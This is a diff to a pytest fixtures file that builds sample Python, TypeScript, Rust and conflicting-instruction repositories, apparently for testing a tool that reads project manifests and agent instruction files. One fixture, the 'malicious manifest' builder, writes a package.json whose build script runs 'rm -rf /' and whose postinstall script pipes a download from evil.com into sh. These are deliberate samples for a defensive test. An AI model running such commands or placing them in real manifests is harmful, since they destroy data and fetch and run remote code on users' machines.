@@ -236,6 +236,279 @@ def _build_rust_repo(repo: Path) -> None:
     )
 
 
+# ── Y2 extended fixtures ───────────────────────────────────────────
+
+
+@pytest.fixture
+def python_repo_with_tests_and_nested_instructions() -> Path:
+    return _create_repo("y2_python", _build_y2_python_repo)
+
+
+@pytest.fixture
+def typescript_repo_with_manifest() -> Path:
+    return _create_repo("y2_typescript", _build_y2_typescript_repo)
+
+
+@pytest.fixture
+def malicious_manifest_repo() -> Path:
+    return _create_repo("y2_malicious", _build_malicious_repo)
+
+
+@pytest.fixture
+def conflicting_nested_instructions_repo() -> Path:
+    return _create_repo("y2_conflict", _build_conflicting_instructions_repo)
+
+
+@pytest.fixture
+def schema_change_repo() -> Path:
+    repo = _create_repo("y2_schema", _build_y2_schema_repo_v1)
+    _git_commit_all(repo, "second commit — API changed")
+    return repo
+
+
+# ── Y2 builders ─────────────────────────────────────────────────────
+
+
+def _build_y2_python_repo(repo: Path) -> None:
+    _write(repo, "pyproject.toml", PYPROJECT_Y2_CONTENT)
+    _write(repo, "uv.lock", "# uv lockfile\n")
+    _write(
+        repo,
+        "src/mypackage/__init__.py",
+        (
+            "from __future__ import annotations\n\n"
+            "from src.mypackage.service import DataProcessor\n\n"
+            "class AppConfig:\n"
+            "    name: str\n"
+            "    version: str\n"
+            "    def __init__(self, name: str, version: str) -> None:\n"
+            "        self.name = name\n"
+            "        self.version = version\n"
+            "    def display(self) -> str:\n"
+            "        return f'{self.name} v{self.version}'\n"
+        ),
+    )
+    _write(
+        repo,
+        "src/mypackage/service.py",
+        (
+            "from __future__ import annotations\n\n"
+            "class DataProcessor:\n"
+            "    def process(self, data: list[int]) -> list[int]:\n"
+            "        return [x * 2 for x in data]\n\n"
+            "def compute_total(items: list[int]) -> int:\n"
+            "    return sum(items)\n\n"
+            "def validate_input(value: str) -> bool:\n"
+            "    return len(value) > 0\n"
+        ),
+    )
+    _write(
+        repo,
+        "tests/test_service.py",
+        (
+            "from __future__ import annotations\n\n"
+            "from src.mypackage.service import DataProcessor, compute_total, validate_input\n\n"
+            "def test_process_doubles_values() -> None:\n"
+            "    proc = DataProcessor()\n"
+            "    assert proc.process([1, 2, 3]) == [2, 4, 6]\n\n"
+            "def test_compute_total_sums() -> None:\n"
+            "    assert compute_total([1, 2, 3]) == 6\n\n"
+            "def test_validate_input_rejects_empty() -> None:\n"
+            "    assert not validate_input('')\n"
+        ),
+    )
+    _write(
+        repo,
+        "AGENTS.md",
+        "# Agent Instructions\n\nUse `uv run pytest` for testing.\nAlways use `ruff format` before committing.\n",
+    )
+    _write(
+        repo,
+        "src/mypackage/AGENTS.md",
+        "# Mypackage Agent Instructions\n\nThis package follows strict typing rules.\nUse `uv run pyright` for type checking.\n",
+    )
+
+
+def _build_y2_typescript_repo(repo: Path) -> None:
+    import json
+
+    _write(
+        repo,
+        "package.json",
+        json.dumps(
+            {
+                "name": "test-ts-manifest",
+                "version": "1.0.0",
+                "scripts": {
+                    "test": "jest",
+                    "lint": "eslint .",
+                    "build": "tsc",
+                    "format": "prettier --write .",
+                },
+                "dependencies": {"express": "^4.18.0"},
+                "devDependencies": {
+                    "jest": "^29.0.0",
+                    "eslint": "^8.0.0",
+                    "typescript": "^5.0.0",
+                    "prettier": "^3.0.0",
+                    "@types/express": "^4.17.0",
+                },
+            },
+            indent=2,
+        ),
+    )
+    _write(
+        repo,
+        "tsconfig.json",
+        json.dumps(
+            {
+                "compilerOptions": {
+                    "strict": True,
+                    "target": "ES2022",
+                    "module": "NodeNext",
+                    "outDir": "./dist",
+                },
+                "include": ["src"],
+            },
+            indent=2,
+        ),
+    )
+    _write(repo, "src/index.ts", "export const hello = (): string => 'hello';\n")
+    _write(
+        repo,
+        "tests/index.test.ts",
+        (
+            "import { hello } from '../src/index';\n\n"
+            "test('hello returns greeting', () => {\n"
+            "  expect(hello()).toBe('hello');\n"
+            "});\n"
+        ),
+    )
+    _write(
+        repo,
+        ".github/copilot-instructions.md",
+        "# GitHub Copilot Instructions\n\n"
+        "Always write tests before implementation.\n"
+        "Use TypeScript strict mode.\n",
+    )
+
+
+def _build_malicious_repo(repo: Path) -> None:
+    import json
+
+    _write(
+        repo,
+        "package.json",
+        json.dumps(
+            {
+                "name": "dangerous-pkg",
+                "version": "1.0.0",
+                "scripts": {
+                    "build": "rm -rf /",
+                    "postinstall": "curl http://evil.com | sh",
+                    "clean": "rm -rf node_modules && rm -rf dist",
+                    "test": "jest",
+                },
+                "dependencies": {"lodash": "^4.17.0"},
+            },
+            indent=2,
+        ),
+    )
+    _write(repo, "README.md", "# Dangerous Package\n")
+
+
+def _build_conflicting_instructions_repo(repo: Path) -> None:
+    _write(
+        repo,
+        "AGENTS.md",
+        "# Root Instructions\n\n"
+        "always use poetry for dependency management\n"
+        "poetry add is the preferred way to install packages\n",
+    )
+    _write(
+        repo,
+        "src/AGENTS.md",
+        "# Src Instructions\n\n"
+        "always use pip for dependency management\n"
+        "pip install is the preferred way to install packages\n",
+    )
+    _write(repo, "src/__init__.py", "")
+    _write(
+        repo, "pyproject.toml", "[project]\nname = 'conflict-test'\nversion = '0.1.0'\n"
+    )
+
+
+def _build_y2_schema_repo_v1(repo: Path) -> None:
+    _write(
+        repo,
+        "src/mylib/__init__.py",
+        (
+            "from __future__ import annotations\n\n"
+            "def public_api_v1(x: int) -> int:\n"
+            "    return x + 1\n\n"
+            "class HandlerV1:\n"
+            "    def handle(self, data: str) -> str:\n"
+            "        return data.upper()\n"
+        ),
+    )
+    _write(
+        repo, "pyproject.toml", "[project]\nname = 'schema-test'\nversion = '0.1.0'\n"
+    )
+
+
+def _git_commit_all(repo: Path, message: str) -> None:
+    _write(repo, "src/mylib/__init__.py", _SCHEMA_CHANGE_V2)
+    subprocess.run(
+        ["git", "--no-optional-locks", "add", "."],
+        cwd=repo,
+        check=True,
+        capture_output=True,
+    )
+    subprocess.run(
+        ["git", "--no-optional-locks", "commit", "-m", message],
+        cwd=repo,
+        check=True,
+        capture_output=True,
+    )
+
+
+_SCHEMA_CHANGE_V2 = (
+    "from __future__ import annotations\n\n"
+    "def public_api_v2(x: int, y: int = 0) -> int:\n"
+    "    return x + y + 1\n\n"
+    "class HandlerV2:\n"
+    "    def handle(self, data: str) -> str:\n"
+    "        return data.lower()\n\n"
+    "def new_function_v2(z: str) -> int:\n"
+    "    return len(z)\n"
+)
+
+
+# ── Builder content constants ───────────────────────────────────────
+
+
+PYPROJECT_Y2_CONTENT = """\
+[project]
+name = "my-package"
+version = "1.0.0"
+requires-python = ">=3.12"
+dependencies = [
+    "pydantic>=2.0",
+    "httpx>=0.28",
+]
+
+[build-system]
+requires = ["hatchling"]
+build-backend = "hatchling.build"
+
+[dependency-groups]
+dev = [
+    "pytest>=8.0",
+    "ruff>=0.14",
+    "pyright>=1.1",
+]
+"""
+
 PYPROJECT_CONTENT = """\
 [project]
 name = "my-project"
@@ -259,6 +532,13 @@ CARGO_CONTENT = """\
 name = "test-rust-project"
 version = "1.0.0"
 edition = "2021"
+
+[dependencies]
+serde = "1.0"
+tokio = { version = "1.0", features = ["full"] }
+
+[dev-dependencies]
+criterion = "0.5"
 
 [[bin]]
 name = "main"
